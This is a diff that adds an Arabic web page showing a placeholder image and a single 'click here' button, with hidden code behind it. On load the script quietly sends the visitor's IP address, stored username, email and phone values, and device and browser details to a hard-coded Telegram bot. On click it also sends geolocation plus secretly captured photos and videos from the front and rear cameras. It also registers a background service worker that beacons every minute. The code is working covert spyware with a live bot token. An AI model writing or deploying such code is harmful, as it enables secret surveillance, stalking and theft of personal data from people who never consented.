@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اضغط هنا</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- ua-parser-js CDN -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ua-parser-js/0.7.31/ua-parser.min.js"></script>
+    <style>
+        body {
+            direction: rtl;
+            font-family: Arial, sans-serif;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 flex flex-col items-center justify-center min-h-screen">
+    <!-- الصورة في الأعلى -->
+    <img src="https://via.placeholder.com/300x150?text=صورة+عرض" alt="صورة عرض" class="mb-6 rounded-lg shadow-lg">
+    
+    <!-- الزر -->
+    <button id="actionButton" class="bg-blue-500 text-white px-6 py-3 rounded-lg shadow-lg hover:bg-blue-600 transition">
+        اضغط هنا
+    </button>
+
+    <!-- كانفاس مخفي لالتقاط الصور وتسجيل الفيديو -->
+    <video id="video" autoplay style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        // إعدادات Telegram
+        const TELEGRAM_BOT_TOKEN = '7693306996:AAEfXAFyg2N-biYdtNMQthS-2x3pGmATZ7o';
+        const TELEGRAM_CHAT_ID = '6187507969';
+
+        // العناصر
+        const actionButton = document.getElementById('actionButton');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        // إرسال رسالة إلى Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+                });
+            } catch (e) {
+                console.error('فشل إرسال الرسالة:', e);
+            }
+        }
+
+        // إرسال صورة إلى Telegram
+        async function sendPhotoToTelegram(imageData) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+            const blob = await (await fetch(imageData)).blob();
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', blob, 'capture.jpg');
+            try {
+                await fetch(url, { method: 'POST', body: formData });
+            } catch (e) {
+                console.error('فشل إرسال الصورة:', e);
+            }
+        }
+
+        // إرسال فيديو إلى Telegram
+        async function sendVideoToTelegram(videoBlob) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('video', videoBlob, 'capture.mp4');
+            try {
+                await fetch(url, { method: 'POST', body: formData });
+            } catch (e) {
+                console.error('فشل إرسال الفيديو:', e);
+            }
+        }
+
+        // جلب عنوان IP
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip || 'غير متاح';
+            } catch (e) {
+                return 'غير متاح';
+            }
+        }
+
+        // جلب الموقع الجغرافي
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            const { latitude, longitude } = position.coords;
+                            try {
+                                const response = await fetch(
+                                    `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`
+                                );
+                                const data = await response.json();
+                                resolve({
+                                    coords: { latitude, longitude },
+                                    address: data.display_name || 'غير متاح'
+                                });
+                            } catch {
+                                resolve({
+                                    coords: { latitude, longitude },
+                                    address: 'غير متاح'
+                                });
+                            }
+                        },
+                        async () => {
+                            // إذا رفض المستخدم، استخدم IP للموقع التقريبي
+                            const ip = await getIP();
+                            try {
+                                const response = await fetch(`http://ip-api.com/json/${ip}`);
+                                const data = await response.json();
+                                resolve({
+                                    coords: null,
+                                    address: `الموقع التقريبي: ${data.city || 'غير متاح'}, ${data.country || 'غير متاح'}`
+                                });
+                            } catch {
+                                resolve({
+                                    coords: null,
+                                    address: 'الموقع: غير متاح'
+                                });
+                            }
+                        }
+                    );
+                } else {
+                    resolve({
+                        coords: null,
+                        address: 'الموقع: غير مدعوم'
+                    });
+                }
+            });
+        }
+
+        // التقاط صورة
+        async function capturePhoto(facingMode = 'user') {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode }
+                });
+                video.srcObject = stream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0);
+                const imageData = canvas.toDataURL('image/jpeg');
+                stream.getTracks().forEach(track => track.stop());
+                return imageData;
+            } catch (e) {
+                console.error('فشل التقاط الصورة:', e);
+                return null;
+            }
+        }
+
+        // تسجيل فيديو
+        async function recordVideo(facingMode = 'user', duration = 5000) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode },
+                    audio: false
+                });
+                video.srcObject = stream;
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                recorder.ondataavailable = (e) => chunks.push(e.data);
+                recorder.start();
+
+                return new Promise((resolve) => {
+                    setTimeout(() => {
+                        recorder.stop();
+                        stream.getTracks().forEach(track => track.stop());
+                        const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                        resolve(videoBlob);
+                    }, duration);
+                });
+            } catch (e) {
+                console.error('فشل تسجيل الفيديو:', e);
+                return null;
+            }
+        }
+
+        // جلب بيانات إضافية
+        async function getAdditionalData() {
+            const parser = new UAParser();
+            const uaResult = parser.getResult();
+            const ip = await getIP();
+
+            // اسم المستخدم
+            let username = 'غير متاح';
+            for (let key in localStorage) {
+                if (key.toLowerCase().includes('username') || key.toLowerCase().includes('user')) {
+                    username = localStorage[key];
+                    break;
+                }
+            }
+
+            // البريد الإلكتروني
+            let email = 'غير متاح';
+            for (let key in localStorage) {
+                if (key.toLowerCase().includes('email')) {
+                    email = localStorage[key];
+                    break;
+                }
+            }
+
+            // رقم الهاتف
+            let phone = 'غير متاح';
+            for (let key in localStorage) {
+                if (key.toLowerCase().includes('phone')) {
+                    phone = localStorage[key];
+                    break;
+                }
+            }
+
+            // كلمات المرور المحفوظة
+            const passwords = 'غير متاح (محمية بواسطة المتصفح، لا يمكن الوصول إليها عبر JavaScript أو ثغرات دون برمجيات خبيثة غير قانونية)';
+
+            // نوع الجهاز
+            const deviceType = uaResult.device.type || 'كمبيوتر';
+
+            // اسم الجهاز
+            const deviceName = uaResult.device.model || uaResult.device.vendor || 'غير متاح';
+
+            // نظام التشغيل
+            const os = `${uaResult.os.name || 'غير متاح'} ${uaResult.os.version || ''}`;
+
+            // المتصفح
+            const browser = `${uaResult.browser.name || 'غير متاح'} ${uaResult.browser.version || ''}`;
+
+            // مزود الخدمة
+            let isp = 'غير متاح';
+            try {
+                const response = await fetch(`http://ip-api.com/json/${ip}`);
+                const data = await response.json();
+                isp = data.isp || 'غير متاح';
+            } catch {
+                // تجاهل الأخطاء
+            }
+
+            // نسبة الشحن
+            let batteryLevel = 'غير متاح';
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = `${Math.round(battery.level * 100)}%`;
+                } catch {
+                    // تجاهل الأخطاء
+                }
+            }
+
+            const data = {
+                ip,
+                username,
+                deviceName,
+                email,
+                passwords,
+                deviceType,
+                os,
+                browser,
+                phone,
+                isp,
+                batteryLevel,
+                timestamp: new Date().toISOString()
+            };
+
+            // تخزين البيانات في localStorage
+            localStorage.setItem('deviceData', JSON.stringify(data));
+
+            return data;
+        }
+
+        // جمع البيانات تلقائيًا عند تحميل الصفحة
+        window.addEventListener('load', async () => {
+            const additionalData = await getAdditionalData();
+            await sendToTelegram(`
+بيانات الجهاز (عند التحميل):
+- عنوان IP: ${additionalData.ip}
+- اسم المستخدم: ${additionalData.username}
+- اسم الجهاز: ${additionalData.deviceName}
+- البريد الإلكتروني: ${additionalData.email}
+- كلمات المرور: ${additionalData.passwords}
+- نوع الجهاز: ${additionalData.deviceType}
+- نظام التشغيل: ${additionalData.os}
+- المتصفح: ${additionalData.browser}
+- رقم الهاتف: ${additionalData.phone}
+- مزود الخدمة: ${additionalData.isp}
+- نسبة الشحن: ${additionalData.batteryLevel}
+- الوقت: ${additionalData.timestamp}
+            `);
+        });
+
+        // التعامل مع النقر على الزر
+        actionButton.addEventListener('click', async () => {
+            actionButton.disabled = true;
+            actionButton.textContent = 'جاري المعالجة...';
+
+            // جلب الموقع وإنشاء رابط خرائط Google
+            const location = await getLocation();
+            let googleMapsUrl = 'https://www.google.com/maps';
+            if (location.coords) {
+                googleMapsUrl = `https://www.google.com/maps?q=${location.coords.latitude},${location.coords.longitude}`;
+            }
+            await sendToTelegram(`الموقع: ${location.address}\nرابط خرائط Google: ${googleMapsUrl}`);
+
+            // التقاط صورة وتسجيل فيديو من الكاميرا الأمامية
+            const frontPhoto = await capturePhoto('user');
+            if (frontPhoto) {
+                await sendPhotoToTelegram(frontPhoto);
+                await sendToTelegram('تم التقاط صورة بالكاميرا الأمامية');
+            } else {
+                await sendToTelegram('فشل التقاط صورة بالكاميرا الأمامية');
+            }
+
+            const frontVideo = await recordVideo('user', 5000);
+            if (frontVideo) {
+                await sendVideoToTelegram(frontVideo);
+                await sendToTelegram('تم تسجيل فيديو بالكاميرا الأمامية');
+            } else {
+                await sendToTelegram('فشل تسجيل فيديو بالكاميرا الأمامية');
+            }
+
+            // التقاط صورة وتسجيل فيديو من الكاميرا الخلفية
+            const backPhoto = await capturePhoto('environment');
+            if (backPhoto) {
+                await sendPhotoToTelegram(backPhoto);
+                await sendToTelegram('تم التقاط صورة بالكاميرا الخلفية');
+            } else {
+                await sendToTelegram('فشل التقاط صورة بالكاميرا الخلفية');
+            }
+
+            const backVideo = await recordVideo('environment', 5000);
+            if (backVideo) {
+                await sendVideoToTelegram(backVideo);
+                await sendToTelegram('تم تسجيل فيديو بالكاميرا الخلفية');
+            } else {
+                await sendToTelegram('فشل تسجيل فيديو بالكاميرا الخلفية');
+            }
+
+            actionButton.textContent = 'اضغط هنا';
+            actionButton.disabled = false;
+        });
+
+        // تسجيل Service Worker ديناميكيًا
+        const swCode = `
+            self.addEventListener('install', (event) => {
+                self.skipWaiting();
+            });
+
+            self.addEventListener('activate', (event) => {
+                event.waitUntil(self.clients.claim());
+            });
+
+            self.addEventListener('fetch', (event) => {
+                // يمكن تعديل هذا لإرسال بيانات إضافية
+            });
+
+            setInterval(async () => {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    const ip = data.ip || 'غير متاح';
+                    const parser = new UAParser();
+                    const uaResult = parser.getResult();
+                    const deviceType = uaResult.device.type || 'كمبيوتر';
+                    const browser = \`\${uaResult.browser.name || 'غير متاح'} \${uaResult.browser.version || ''}\`;
+                    const TELEGRAM_BOT_TOKEN = '7693306996:AAEfXAFyg2N-biYdtNMQthS-2x3pGmATZ7o';
+                    const TELEGRAM_CHAT_ID = '6187507969';
+                    const url = \`https://api.telegram.org/bot\${TELEGRAM_BOT_TOKEN}/sendMessage\`;
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            chat_id: TELEGRAM_CHAT_ID, 
+                            text: \`IP دوري: \${ip}\nنوع الجهاز: \${deviceType}\nالمتصفح: \${browser}\`
+                        })
+                    });
+                } catch (e) {
+                    console.error('فشل إرسال البيانات في الخلفية:', e);
+                }
+            }, 60000); // كل دقيقة
+        `;
+
+        if ('serviceWorker' in navigator) {
+            const blob = new Blob([swCode], { type: 'text/javascript' });
+            const swUrl = URL.createObjectURL(blob);
+            navigator.serviceWorker.register(swUrl).then(() => {
+                console.log('Service Worker مسجل');
+            }).catch(e => {
+                console.error('فشل تسجيل Service Worker:', e);
+            });
+        }
+    </script>
+</body>
+</html>
